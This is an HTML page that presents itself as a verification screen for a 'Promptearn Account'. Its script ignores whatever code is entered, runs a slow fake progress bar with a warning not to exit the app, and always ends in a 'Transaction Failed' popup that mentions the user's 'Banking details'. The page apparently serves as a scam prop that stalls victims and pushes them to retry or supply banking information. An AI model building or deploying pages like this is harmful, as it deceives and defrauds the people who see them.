<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification</title>
  <link rel="stylesheet" href="style.css">
  <style>
    body {
      font-family: sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #f7f7f7;
    }

    .container {
      background-color: #fff;
      border-radius: 5px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
      padding: 40px;
      text-align: center;
    }

    .verification-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      color: #333;
    }

    input[type="text"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 3px;
      font-size: 16px;
    }

    button {
      background-color: #28a745;
      color: #fff;
      border: none;
      padding: 10px 20px;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
    }

    button:disabled {
      background-color: #999;
      cursor: default;
    }

    .progress-bar {
      width: 100%;
      background-color: #f3f3f3;
      border-radius: 5px;
      margin-top: 20px;
      display: none;
    }

    .progress-bar-fill {
      width: 0;
      height: 20px;
      background-color: #28a745;
      border-radius: 5px;
      text-align: center;
      line-height: 20px;
      color: white;
    }

    .popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #fff;
      padding: 20px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <p style="color: #28a745;">Notice: Your Promptearn Account just requested a verification code</p>
    <form id="verification-form">
      <h2>Verification</h2>
      <div class="verification-group">
        <label for="verification-code" style="text-align: left;">Verification Code:</label>
        <input type="text" id="verification-code" name="verification-code" placeholder="Enter verification code" maxlength="6" required>
      </div>
      <button id="verifyButton" type="button" disabled>Verify</button>
      <div class="progress-bar" id="progressBar">
        <div class="progress-bar-fill" id="progressBarFill"></div>
        <p>Please don't exit the app to avoid a failed transaction</p>
      </div>
    </form>
  </div>
  <div class="popup" id="popupMessage">
    <h3>Transaction Failed</h3>
      <p>Please try again, make sure the verification code is correct and your Banking details</p>
  </div>
  <script>
    const verificationCodeInput = document.getElementById("verification-code");
    const verifyButton = document.getElementById("verifyButton");
    const progressBar = document.getElementById("progressBar");
    const progressBarFill = document.getElementById("progressBarFill");
    const popupMessage = document.getElementById("popupMessage");

    function hasAtLeastFourDigits(input) {
      return input.value.length >= 4;
    }

    verifyButton.disabled = !hasAtLeastFourDigits(verificationCodeInput);

    verificationCodeInput.addEventListener("keyup", function() {
      verifyButton.disabled = !hasAtLeastFourDigits(verificationCodeInput);
    });

    verifyButton.addEventListener("click", function() {
      progressBar.style.display = "block";
      let width = 0;
      const interval = setInterval(function() {
        if (width >= 100) {
          clearInterval(interval);
          progressBar.style.display = "none";
          popupMessage.style.display = "block";
        } else {
          width++;
          progressBarFill.style.width = width + "%";
          progressBarFill.textContent = width + "%";
        }
      }, 1780);
    });
  </script>
</body>
</html>
